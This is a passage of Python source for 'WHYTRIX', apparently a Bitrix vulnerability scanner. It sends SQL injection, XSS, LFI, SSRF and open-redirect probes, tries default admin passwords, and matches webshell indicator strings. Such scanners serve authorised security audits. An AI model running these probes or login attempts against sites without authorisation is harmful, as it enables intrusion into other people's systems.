                            param=param, payload=payload,
                            detail=f"Response delayed {elapsed:.1f}s",
                            category='SQLi'
                        ))
                        log_vuln(f"HIGH | SQLi Time-Based | param={param}")
                else:
                    r = safe_get(session, endpoint, params={param: payload})
                    if not r:
                        continue
                    body = r.text.lower()
                    for err in SQL_ERRORS:
                        if re.search(err, body):
                            findings.append(Finding(
                                f'SQL Injection (Error-Based) — {ptype}',
                                'HIGH', endpoint,
                                param=param, payload=payload,
                                detail=f"SQL error pattern: '{err}'",
                                category='SQLi',
                                evidence=r.text[max(0, body.find(err)-50):body.find(err)+100]
                            ))
                            log_vuln(f"HIGH | SQLi Error-Based | param={param} | error='{err}'")
                            break
                log_verbose(f"SQLi test: {endpoint} | {param}={payload[:30]}", verbose)

    return findings

def scan_xss(session, base_url, verbose=False):
    """XSS scanning on Bitrix endpoints"""
    findings = []
    log_info("Testing XSS vectors...")

    endpoints = [
        (base_url + '/search/', ['q', 'query', 'searchString']),
        (base_url + '/', ['q', 'search', 'message', 'name', 'comment']),
        (base_url + '/blog/', ['q', 'tag', 'name', 'comment', 'text']),
        (base_url + '/bitrix/admin/', ['lang', 'back_url']),
        (base_url + '/bitrix/tools/send_mail.php', ['to', 'subject', 'body']),
        (base_url + '/bitrix/components/bitrix/search.page/ajax.php', ['q']),
        (base_url + '/bitrix/services/main/ajax.php', ['data']),
    ]

    for endpoint, params in endpoints:
        for param in params:
            for payload in XSS_PAYLOADS:
                token = 'whytrix' + ''.join(random.choices(string.ascii_lowercase, k=6))
                test_payload = payload.replace('alert(1)', f'alert("{token}")')

                r = safe_get(session, endpoint, params={param: test_payload})
                if not r:
                    continue

                if token in r.text or test_payload in r.text:
                    # Check if it's actually rendered (not just in value attr safely)
                    context = 'reflected'
                    if f'<script>alert("{token}")</script>' in r.text:
                        context = 'rendered_script'
                    elif f'onerror=alert("{token}")' in r.text:
                        context = 'rendered_event'

                    findings.append(Finding(
                        f'Reflected XSS',
                        'HIGH', endpoint,
                        param=param, payload=payload,
                        detail=f"Payload reflected in response | context: {context}",
                        category='XSS',
                        evidence=r.text[max(0, r.text.find(token)-50):r.text.find(token)+100]
                    ))
                    log_vuln(f"HIGH | XSS | param={param} | context={context}")
                log_verbose(f"XSS: {endpoint} | {param}={payload[:30]}", verbose)

    return findings

def scan_lfi(session, base_url, verbose=False):
    """Local File Inclusion scanning"""
    findings = []
    log_info("Testing LFI vectors...")

    endpoints = [
        (base_url + '/', ['file', 'path', 'page', 'template', 'include',
                          'inc', 'load', 'document', 'content', 'lang', 'layout']),
        (base_url + '/bitrix/admin/', ['lang', 'theme']),
        (base_url + '/bitrix/tools/', ['file', 'path']),
    ]

    for endpoint, params in endpoints:
        for param in params:
            for payload in LFI_PAYLOADS:
                r = safe_get(session, endpoint, params={param: payload})
                if not r:
                    continue
                for indicator in LFI_INDICATORS:
                    if indicator.lower() in r.text.lower():
                        findings.append(Finding(
                            'Local File Inclusion (LFI)',
                            'CRITICAL', endpoint,
                            param=param, payload=payload,
                            detail=f"File content indicator found: '{indicator}'",
                            category='LFI',
                            evidence=r.text[:200]
                        ))
                        log_vuln(f"CRITICAL | LFI | param={param} | indicator='{indicator}'")
                        break
                log_verbose(f"LFI: {endpoint} | {param}={payload[:30]}", verbose)

    return findings

def scan_ssrf(session, base_url, verbose=False):
    """SSRF scanning on Bitrix-specific endpoints"""
    findings = []
    log_info("Testing SSRF vectors...")

    for path in SSRF_BITRIX_PATHS:
        url = base_url + path
        r = safe_get(session, url)
        if not r or r.status_code == 404:
            continue

        for ssrf_payload in SSRF_PAYLOADS[:5]:  # top 5
            for param in SSRF_BITRIX_PARAMS[:5]:
                r2 = safe_get(session, url, params={param: ssrf_payload})
                if not r2:
                    continue

                # Indicators of SSRF success
                ssrf_indicators = ['ami-id', 'instance-id', 'local-ipv4',
                                   'iam/security-credentials', 'computeMetadata',
                                   'metadata.google', '169.254', 'root:x:',
                                   'SSH-', 'redis_version', 'mysql_native_password']

                for ind in ssrf_indicators:
                    if ind.lower() in r2.text.lower():
                        findings.append(Finding(
                            'Server-Side Request Forgery (SSRF)',
                            'CRITICAL', url,
                            param=param, payload=ssrf_payload,
                            detail=f"Internal resource indicator: '{ind}'",
                            category='SSRF',
                            evidence=r2.text[:200]
                        ))
                        log_vuln(f"CRITICAL | SSRF | {path} | {param}={ssrf_payload[:40]}")
                log_verbose(f"SSRF: {url} | {param}={ssrf_payload[:30]}", verbose)

    return findings

def scan_auth(session, base_url, verbose=False):
    """Authentication & session security checks"""
    findings = []
    log_info("Checking authentication & session security...")

    admin_url = base_url + '/bitrix/admin/index.php'
    r = safe_get(session, admin_url)

    if r:
        # Check if admin is accessible without auth
        if r.status_code == 200 and 'logout' in r.text.lower():
            findings.append(Finding(
                'Admin Panel Accessible Without Authentication',
                'CRITICAL', admin_url,
                detail='Admin panel accessible — no authentication required',
                category='Auth Bypass'
            ))
            log_vuln("CRITICAL | Admin panel open without auth")

        # Check for default credentials
        default_creds = [
            ('admin', 'admin'), ('admin', '1'), ('admin', '123456'),
            ('admin', 'password'), ('admin', 'bitrix'), ('admin', 'Admin1'),
            ('administrator', 'administrator'), ('admin', 'qwerty'),
        ]
        for username, password in default_creds:
            data = {
                'AUTH_FORM': 'Y', 'TYPE': 'AUTH',
                'USER_LOGIN': username, 'USER_PASSWORD': password,
                'USER_REMEMBER': 'Y',
            }
            r2 = safe_post(session, admin_url, data=data)
            if r2 and ('logout' in r2.text.lower() or 'Выход' in r2.text or
                       'admin' in r2.url):
                findings.append(Finding(
                    'Default/Weak Admin Credentials',
                    'CRITICAL', admin_url,
                    payload=f"{username}:{password}",
                    detail=f"Login successful with default credentials: {username}/{password}",
                    category='Auth Bypass'
                ))
                log_vuln(f"CRITICAL | Default creds: {username}/{password}")
                break
            log_verbose(f"Tried {username}:{password}", verbose)

    # Session security
    r_main = safe_get(session, base_url)
    if r_main:
        cookies = r_main.cookies
        for cookie in cookies:
            issues = []
            if not cookie.secure:
                issues.append('missing Secure flag')
            if not cookie.has_nonstandard_attr('HttpOnly'):
                issues.append('missing HttpOnly flag')
            if not cookie.has_nonstandard_attr('SameSite'):
                issues.append('missing SameSite')
            if issues:
                findings.append(Finding(
                    f'Insecure Cookie: {cookie.name}',
                    'MEDIUM', base_url,
                    detail=f"Cookie '{cookie.name}': {', '.join(issues)}",
                    category='Session Security'
                ))
                log_warn(f"Insecure cookie: {cookie.name} — {', '.join(issues)}")

    # CSRF check
    r_admin = safe_get(session, admin_url)
    if r_admin and 'csrf' not in r_admin.text.lower() and 'sessid' not in r_admin.text.lower():
        findings.append(Finding(
            'Possible Missing CSRF Protection',
            'MEDIUM', admin_url,
            detail='No CSRF token found in admin form',
            category='CSRF'
        ))

    return findings

def scan_open_redirect(session, base_url, verbose=False):
    """Open redirect scanning"""
    findings = []
    log_info("Testing open redirects...")

    redirect_urls = [
        base_url + '/bitrix/redirect.php',
        base_url + '/bitrix/rk.php',
        base_url + '/redirect',
        base_url + '/go',
    ]

    for url in redirect_urls:
        for param in REDIRECT_PARAMS[:5]:
            for payload in REDIRECT_PAYLOADS[:3]:
                r = safe_get(session, url, params={param: payload},
                             timeout=5, allow_redirects=False)
                if not r:
                    continue
                if r.status_code in (301, 302, 303, 307, 308):
                    loc = r.headers.get('Location', '')
                    if 'evil.com' in loc:
                        findings.append(Finding(
                            'Open Redirect',
                            'MEDIUM', url,
                            param=param, payload=payload,
                            detail=f"Redirects to: {loc}",
                            category='Open Redirect'
                        ))
                        log_vuln(f"MEDIUM | Open Redirect | {url}?{param}={payload}")
                log_verbose(f"Redirect: {url} | {param}={payload}", verbose)

    return findings

def scan_info_disclosure(session, base_url, verbose=False):
    """Information disclosure checks"""
    findings = []
    log_info("Checking information disclosure...")

    # Error-based disclosure
    error_paths = [
        base_url + '/bitrix/admin/index.php?lang=../../etc/passwd',
        base_url + "/'",
        base_url + '/bitrix/admin/index.php?login=Y&wrong_param=%27',
        base_url + '/bitrix/components/bitrix/catalog/ajax.php?action=invalid',
    ]

    for url in error_paths:
        r = safe_get(session, url)
        if not r:
            continue
        body = r.text
        # PHP errors
        php_errors = ['Fatal error', 'Warning:', 'Notice:', 'Parse error',
                      'Uncaught Error', 'Stack trace', 'in /var/www',
                      'in /home/', 'in C:\\', '#0 ', '#1 ']
        for err in php_errors:
            if err in body:
                findings.append(Finding(
                    'PHP Error Disclosure',
                    'MEDIUM', url,
                    detail=f"PHP error exposed: '{err}'",
                    category='Info Disclosure',
                    evidence=body[max(0,body.find(err)-30):body.find(err)+150]
                ))
                log_vuln(f"MEDIUM | PHP Error Disclosure | '{err}'")
                break

    # Debug mode check
    r = safe_get(session, base_url + '/?debug=1')
    if r and 'xdebug' in r.text.lower():
        findings.append(Finding(
            'Xdebug Debug Mode Active',
            'HIGH', base_url + '/?debug=1',
            detail='Xdebug is enabled and exposing debug info',
            category='Info Disclosure'
        ))

    # Bitrix debug mode
    r = safe_get(session, base_url + '/?bx_debug=Y')
    if r and ('sql' in r.text.lower() or 'query' in r.text.lower()):
        findings.append(Finding(
            'Bitrix Debug Mode Enabled',
            'HIGH', base_url + '/?bx_debug=Y',
            detail='Bitrix debug mode exposes SQL queries and internal info',
            category='Info Disclosure'
        ))
        log_vuln("HIGH | Bitrix Debug Mode")

    # Check for exposed install wizard
    r = safe_get(session, base_url + '/bitrix/wizard/')
    if r and r.status_code == 200 and 'wizard' in r.text.lower():
        findings.append(Finding(
            'Bitrix Install Wizard Accessible',
            'CRITICAL', base_url + '/bitrix/wizard/',
            detail='Install wizard is accessible — may allow reinstallation',
            category='Misconfig'
        ))
        log_vuln("CRITICAL | Install Wizard Exposed")

    return findings

def scan_upload(session, base_url, verbose=False):
    """File upload & webshell checks"""
    findings = []
    log_info("Checking upload functionality & webshells...")

    # Check if upload dir is listable
    for path in ['/upload/', '/upload/files/', '/upload/iblock/']:
        r = safe_get(session, base_url + path)
        if r and r.status_code == 200:
            if 'index of' in r.text.lower() or '<a href=' in r.text.lower():
                findings.append(Finding(
                    'Directory Listing Enabled',
                    'HIGH', base_url + path,
                    detail=f'Directory listing exposed at {path}',
                    category='Misconfig'
                ))
                log_vuln(f"HIGH | Directory Listing | {path}")

    # Check for common webshells
    webshells = [
        '/upload/shell.php', '/upload/cmd.php', '/upload/c99.php',
        '/upload/r57.php', '/upload/wso.php', '/upload/b374k.php',
        '/bitrix/tmp/shell.php', '/bitrix/cache/shell.php',
        '/images/shell.php', '/files/shell.php',
        '/upload/1.php', '/upload/test.php',
    ]
    for path in webshells:
        r = safe_get(session, base_url + path)
        if r and r.status_code == 200 and len(r.text) > 0:
            if any(ind in r.text.lower() for ind in
                   ['eval(', 'base64_decode', 'system(', 'passthru',
                    'shell_exec', 'cmd', 'phpinfo', 'uid=']):
                findings.append(Finding(
                    'Webshell Detected!',
                    'CRITICAL', base_url + path,
                    detail=f'Active webshell found at {path}',
                    category='RCE',
                    evidence=r.text[:200]
                ))
                log_vuln(f"CRITICAL | Webshell | {path}")

    return findings

def scan_api(session, base_url, verbose=False):
    """REST API and AJAX endpoint checks"""
    findings = []
    log_info("Scanning REST API & AJAX endpoints...")

    # REST API discovery
    rest_endpoints = [
        '/rest/1/[TOKEN]/user.current',
        '/rest/1/[TOKEN]/app.info',
        '/rest/1/[TOKEN]/profile',
        '/bitrix/rest/',
        '/api/',
    ]

    r = safe_get(session, base_url + '/rest/')
    if r and r.status_code == 200:
        findings.append(Finding(
            'REST API Endpoint Accessible',
            'MEDIUM', base_url + '/rest/',
            detail='Bitrix REST API endpoint accessible without token check',
            category='API Security'
        ))
        log_warn("REST API accessible")

    # AJAX endpoints
    ajax_paths = [
        '/bitrix/services/main/ajax.php',
        '/bitrix/components/bitrix/search.page/ajax.php',
        '/bitrix/components/bitrix/socialnetwork.log.entry/ajax.php',
        '/bitrix/components/bitrix/catalog/ajax.php',
        '/bitrix/components/bitrix/sale.basket.basket/ajax.php',
        '/bitrix/tools/sale_ajax.php',
        '/bitrix/tools/captcha.php',
    ]

    for path in ajax_paths:
        r = safe_get(session, base_url + path)
        if r and r.status_code == 200:
            log_verbose(f"AJAX endpoint found: {path}", verbose)
            # Test for SSRF via url param
            for ssrf_url in ['http://127.0.0.1/', 'http://169.254.169.254/']:
                r2 = safe_get(session, base_url + path,
                              params={'url': ssrf_url, 'action': 'getUrl'})
                if r2 and any(ind in r2.text.lower() for ind in
                              ['169.254', 'instance', 'local', 'connection refused']):
                    findings.append(Finding(
                        'SSRF via AJAX Endpoint',
                        'HIGH', base_url + path,
                        param='url', payload=ssrf_url,
                        detail='AJAX endpoint may be vulnerable to SSRF',
                        category='SSRF'
                    ))
                    log_vuln(f"HIGH | SSRF via AJAX | {path}")

    return findings

def scan_headers(session, base_url, verbose=False):
    """Security header analysis"""
    findings = []
    log_info("Analyzing security headers...")

    r = safe_get(session, base_url)
    if not r:
        return findings

    headers = {k.lower(): v for k, v in r.headers.items()}

    security_headers = {
        'strict-transport-security': ('HSTS Missing', 'MEDIUM'),
        'x-content-type-options': ('X-Content-Type-Options Missing', 'LOW'),
        'x-frame-options': ('Clickjacking Protection Missing (X-Frame-Options)', 'MEDIUM'),
        'x-xss-protection': ('X-XSS-Protection Missing', 'LOW'),
        'content-security-policy': ('CSP Missing', 'MEDIUM'),
        'referrer-policy': ('Referrer-Policy Missing', 'LOW'),
        'permissions-policy': ('Permissions-Policy Missing', 'LOW'),
    }

    for header, (title, severity) in security_headers.items():
        if header not in headers:
            findings.append(Finding(
                title, severity, base_url,
                detail=f"Missing security header: {header}",
                category='Security Headers'
            ))
            log_warn(f"Missing: {header}")

    # Dangerous headers
    if 'server' in headers:
        sv = headers['server']
        if any(v in sv.lower() for v in ['apache/', 'nginx/', 'iis/', 'php/']):
            findings.append(Finding(
                'Verbose Server Header',
                'LOW', base_url,
                detail=f"Server: {sv}",
                category='Info Disclosure'
            ))

    return findings

# ─────────────────────────────────────────────────────────────────────────────
#  OUTPUT & REPORT
# ─────────────────────────────────────────────────────────────────────────────
def print_summary(findings, elapsed):
    counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'INFO': 0}
    for f in findings:
        counts[f.severity] = counts.get(f.severity, 0) + 1

    print()
    print(grad_line(64))
    grad_print(f"  WHYTRIX SCAN SUMMARY", delay=0.005)
    print(grad_line(64))
    print()

    sev_order = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']
    for sev in sev_order:
        n = counts.get(sev, 0)
        if n > 0:
            c = SEVERITY_COLORS[sev]
            bar = gch(0) + '█' * min(n * 3, 40) + RST
            print(f"  {c}{BO}{sev:<10}{RST} {W}{n:>3}{RST}  {bar}")

    print()
    print(f"  {B1}Total findings:{RST} {W}{len(findings)}{RST}  "
          f"{GR}Scan time: {elapsed:.1f}s{RST}")
    print()
    print(grad_line(64))
    print()

def save_report(findings, path, target):
    with open(path, 'w', encoding='utf-8') as f:
        f.write(f"# WHYTRIX Report — {datetime.now()}\n")
        f.write(f"# Target: {target}\n")
        f.write(f"# Total findings: {len(findings)}\n\n")
        for i, fi in enumerate(findings, 1):
            f.write(f"[{i}] [{fi.severity}] {fi.title}\n")
            f.write(f"    URL:      {fi.url}\n")
            if fi.cve: f.write(f"    CVE:      {fi.cve}\n")
            if fi.param: f.write(f"    Param:    {fi.param}\n")
            if fi.payload: f.write(f"    Payload:  {fi.payload}\n")
            if fi.detail: f.write(f"    Detail:   {fi.detail}\n")
            if fi.evidence: f.write(f"    Evidence: {fi.evidence}\n")
            f.write(f"    Category: {fi.category}\n\n")

# ─────────────────────────────────────────────────────────────────────────────
#  HELP & INTERACTIVE SHELL
# ─────────────────────────────────────────────────────────────────────────────
def show_help():
    print(grad_line(64))
    grad_print(f"  WHYTRIX — Bitrix Vulnerability Scanner  v{VERSION}", delay=0.003)
    print(grad_line(64))
    print(f"""
  {B2}USAGE:{RST}
    {B1}./whytrix.sh{RST} [options] -u <url>

  {B2}TARGET:{RST}
    {W}-u{RST} <url>         Target URL (Bitrix site)

  {B2}SCAN MODULES:{RST}
    {W}--paths{RST}          Sensitive path enumeration
    {W}--cves{RST}           Known Bitrix CVE tests (40+)
    {W}--sqli{RST}           SQL injection scanning
    {W}--xss{RST}            XSS scanning
    {W}--lfi{RST}            Local File Inclusion
    {W}--ssrf{RST}           Server-Side Request Forgery
    {W}--auth{RST}           Auth bypass & default creds
    {W}--redirect{RST}       Open redirect
    {W}--info{RST}           Info disclosure & PHP errors
    {W}--upload{RST}         Upload dir & webshell check
    {W}--api{RST}            REST API & AJAX endpoints
    {W}--headers{RST}        Security headers analysis
    {W}--all{RST}            Run ALL modules (full audit)

  {B2}REQUEST OPTIONS:{RST}
    {W}--cookies{RST} <c>    Cookies (name=val; name2=val2)
    {W}--proxy{RST} <p>      HTTP proxy (http://127.0.0.1:8080)
    {W}--delay{RST} <s>      Delay between requests
    {W}--timeout{RST} <s>    Request timeout (default: 10)
    {W}--ua{RST} <agent>     Custom User-Agent

  {B2}OUTPUT:{RST}
    {W}-o{RST} <file>        Save report to file
    {W}-v{RST}               Verbose mode
    {W}-i{RST}               Interactive shell

  {B2}EXAMPLES:{RST}
    {DIM}./whytrix.sh -u https://bitrix-site.ru --all{RST}
    {DIM}./whytrix.sh -u https://bitrix-site.ru --sqli --xss --cves{RST}
    {DIM}./whytrix.sh -u https://bitrix-site.ru --auth --cookies "PHPSESSID=abc"{RST}
    {DIM}./whytrix.sh -u https://bitrix-site.ru --all --proxy http://127.0.0.1:8080 -o report.txt{RST}
    {DIM}./whytrix.sh -i{RST}
""")
    print(sep_line(64))

def interactive_shell():
    cfg = {
        'url': '', 'cookies': '', 'proxy': '', 'ua': '',
        'timeout': 10, 'delay': 0, 'verbose': False,
        'output': '',
        'modules': {
            'paths': False, 'cves': False, 'sqli': False,
            'xss': False, 'lfi': False, 'ssrf': False,
            'auth': False, 'redirect': False, 'info': False,
            'upload': False, 'api': False, 'headers': False,
        }
    }

    print(f"\n  {GR}Type {W}help{GR} for usage, {W}exit{GR} to quit.{RST}\n")

    while True:
        try:
            sys.stdout.write('\n')
            for i, ch in enumerate("whytrix"):
                sys.stdout.write(gch(i*3) + ch + RST)
            sys.stdout.write(f" {V2}>{RST} ")
            sys.stdout.flush()
            line = input().strip()
        except (EOFError, KeyboardInterrupt):
            print(f"\n\n  {GR}Goodbye.{RST}\n")
            sys.exit(0)

        if not line:
            continue
        parts = line.split()
        cmd = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else ''
        rest = ' '.join(parts[2:]) if len(parts) > 2 else ''

        if cmd in ('exit', 'quit', 'q'):
            print(f"\n  {GR}Goodbye.{RST}\n"); sys.exit(0)

        elif cmd == 'help':
            show_help()

        elif cmd == 'clear':
            os.system('clear')

        elif cmd == 'set':
            key = arg.lower()
            val = rest or (parts[2] if len(parts) > 2 else '')
            if key == 'url':
                cfg['url'] = normalize_url(val)
                print(f"  {B2}URL{RST} => {W}{cfg['url']}{RST}")
            elif key == 'cookies':
                cfg['cookies'] = val
                print(f"  {B2}COOKIES{RST} => {W}{val}{RST}")
            elif key == 'proxy':
                cfg['proxy'] = val
                print(f"  {B2}PROXY{RST} => {W}{val}{RST}")
            elif key == 'output':
                cfg['output'] = val
                print(f"  {B2}OUTPUT{RST} => {W}{val}{RST}")
            elif key == 'timeout':
                cfg['timeout'] = int(val)
                print(f"  {B2}TIMEOUT{RST} => {W}{val}s{RST}")
            elif key == 'delay':
                cfg['delay'] = float(val)
                print(f"  {B2}DELAY{RST} => {W}{val}s{RST}")
            else:
                print(f"  {YEL}[!]{RST} Unknown: {key}")

        elif cmd == 'use':
            mod = arg.lower().lstrip('-')
            if mod == 'all':
                for k in cfg['modules']:
                    cfg['modules'][k] = True
                print(f"  {B2}[*]{RST} All modules: {W}ON{RST}")
            elif mod in cfg['modules']:
                cfg['modules'][mod] = True
                print(f"  {B2}[*]{RST} Module {W}{mod}{RST}: ON")
            else:
                print(f"  {YEL}[!]{RST} Modules: {', '.join(cfg['modules'].keys())} | all")

        elif cmd == 'show':
            print(f"\n  {BO}{W}Options:{RST}")
            print(sep_line(60))
            print(f"  {B1}{'URL':<12}{RST}  {V2}{cfg['url'] or '<not set>'}{RST}")
            print(f"  {B1}{'COOKIES':<12}{RST}  {V2}{cfg['cookies'] or '<none>'}{RST}")
            print(f"  {B1}{'PROXY':<12}{RST}  {V2}{cfg['proxy'] or '<none>'}{RST}")
            print(f"  {B1}{'OUTPUT':<12}{RST}  {V2}{cfg['output'] or '<none>'}{RST}")
            print(f"  {B1}{'TIMEOUT':<12}{RST}  {V2}{cfg['timeout']}s{RST}")
            print()
            print(f"  {B2}{'MODULE':<14} {'STATUS'}{RST}")
            print(sep_line(40))
            for mod, enabled in cfg['modules'].items():
                sc = B2 if enabled else GR
                st = 'ON' if enabled else 'off'
                print(f"  {sc}{mod:<14} {st}{RST}")
            print()

        elif cmd in ('run', 'scan', 'go', 'fire', 'attack'):
            if not cfg['url']:
                print(f"  {RED}[-]{RST} No URL. Use: set url https://target.ru")
                continue

            class A:
                pass
            a = A()
            a.url = cfg['url']
            a.cookies = cfg['cookies']
            a.proxy = cfg['proxy']
            a.ua = cfg['ua']
            a.timeout = cfg['timeout']
            a.delay = cfg['delay']
            a.verbose = cfg['verbose']
            a.output = cfg['output']
            a.scan_all = all(cfg['modules'].values())
            for k, v in cfg['modules'].items():
                setattr(a, k, v)
            do_scan(a)

        elif cmd.startswith('http'):
            cfg['url'] = normalize_url(cmd)
            print(f"  {B2}URL{RST} => {W}{cfg['url']}{RST}")

        else:
            print(f"  {YEL}[!]{RST} Unknown: {cmd}. Type 'help'.")

# ─────────────────────────────────────────────────────────────────────────────
#  MAIN SCAN RUNNER
# ─────────────────────────────────────────────────────────────────────────────
def do_scan(args):
    url = normalize_url(args.url)
    session = make_session(
        cookies=getattr(args, 'cookies', '') or '',
        proxy=getattr(args, 'proxy', '') or '',
        ua=getattr(args, 'ua', '') or '',
    )
    verbose = getattr(args, 'verbose', False)
    scan_all = getattr(args, 'scan_all', False)

    shot_animation(url)
    print(grad_line(64))
    grad_print(f"  TARGET: {url}", delay=0.004)
    print(f"  {GR}Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{RST}")
    print(grad_line(64))
    print()

    start = time.time()
    all_findings = []

    def run_module(name, func):
        if scan_all or getattr(args, name, False):
            print()
            print(sep_line(64))
            grad_print(f"  MODULE: {name.upper()}", delay=0.003)
            print(sep_line(64))
            try:
                results = func(session, url, verbose)
                all_findings.extend(results)
                log_ok(f"{name}: {len(results)} finding(s)")
            except Exception as e:
                log_err(f"{name} error: {e}")

    # Always fingerprint
    print(sep_line(64))
    grad_print("  MODULE: FINGERPRINT", delay=0.003)
    print(sep_line(64))
    fp_findings, bitrix_info = scan_fingerprint(session, url, verbose)
    all_findings.extend(fp_findings)
    log_ok(f"fingerprint: {len(fp_findings)} finding(s)")

    run_module('headers',  scan_headers)
    run_module('paths',    scan_sensitive_paths)
    run_module('cves',     scan_cves)
    run_module('auth',     scan_auth)
    run_module('sqli',     scan_sqli)
    run_module('xss',      scan_xss)
    run_module('lfi',      scan_lfi)
    run_module('ssrf',     scan_ssrf)
    run_module('upload',   scan_upload)
    run_module('api',      scan_api)
    run_module('info',     scan_info_disclosure)
    run_module('redirect', scan_open_redirect)

    # Print all findings
    if all_findings:
        print()
        print(grad_line(64))
        grad_print(f"  ALL FINDINGS ({len(all_findings)})", delay=0.004)
        print(grad_line(64))
        for f in all_findings:
            f.print()
            print(sep_line(60))

    elapsed = time.time() - start
    print_summary(all_findings, elapsed)

    if getattr(args, 'output', None):
        save_report(all_findings, args.output, url)
        log_ok(f"Report saved: {W}{args.output}{RST}")

    return all_findings

# ─────────────────────────────────────────────────────────────────────────────
#  CLI
# ─────────────────────────────────────────────────────────────────────────────
def build_parser():
    p = argparse.ArgumentParser(prog='whytrix', add_help=False)
    p.add_argument('-u', '--url', default=None)
    p.add_argument('--all', dest='scan_all', action='store_true')
    p.add_argument('--paths', action='store_true')
    p.add_argument('--cves', action='store_true')
    p.add_argument('--sqli', action='store_true')
    p.add_argument('--xss', action='store_true')
    p.add_argument('--lfi', action='store_true')
    p.add_argument('--ssrf', action='store_true')
    p.add_argument('--auth', action='store_true')
    p.add_argument('--redirect', action='store_true')
    p.add_argument('--info', action='store_true')
    p.add_argument('--upload', action='store_true')
    p.add_argument('--api', action='store_true')
    p.add_argument('--headers', action='store_true')
    p.add_argument('--cookies', default='')
    p.add_argument('--proxy', default='')
    p.add_argument('--ua', default='')
    p.add_argument('--delay', type=float, default=0)
    p.add_argument('--timeout', type=int, default=10)
    p.add_argument('-o', '--output', default=None)
    p.add_argument('-v', '--verbose', action='store_true')
    p.add_argument('-i', '--interactive', action='store_true')
    p.add_argument('-h', '--help', action='store_true')
    return p

def main():
    import signal
    signal.signal(signal.SIGINT,
                  lambda s, f: (print(f"\n\n{V2}[!]{RST} Interrupted.\n"), sys.exit(130)))

    show_banner()
    parser = build_parser()
    args, _ = parser.parse_known_args()

    if args.help:
        show_help(); sys.exit(0)

    if args.interactive or not args.url:
        interactive_shell(); return

    do_scan(args)

if __name__ == '__main__':
    main()
